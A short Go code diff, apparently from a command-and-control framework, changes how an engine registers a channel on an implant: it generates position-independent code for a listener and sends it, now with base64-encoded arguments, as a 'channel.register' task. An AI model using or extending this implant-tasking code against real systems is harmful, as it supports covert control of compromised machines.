@@ -229,7 +229,7 @@ func (e *Engine) ImplantChannelRegister(id uint32, name string) error {
 		return nil
 	}
 
-	pic, err := listener.Interface.MakePic(listener.ID)
+	pic, args, err := listener.Interface.MakePic(listener.ID)
 	if err != nil {
 		logger.Error("MakePic error: %v", err)
 		return nil
@@ -241,7 +241,7 @@ func (e *Engine) ImplantChannelRegister(id uint32, name string) error {
 	// execute channel.register command
 	e.ImplantTaskExecute(id, map[string]any{
 		"name":     "channel.register",
-		"args":     []uint32{listener.ID},
+		"args":     []string{base64.StdEncoding.EncodeToString(args)},
 		"artifact": base64.StdEncoding.EncodeToString(pic),
 	})
 
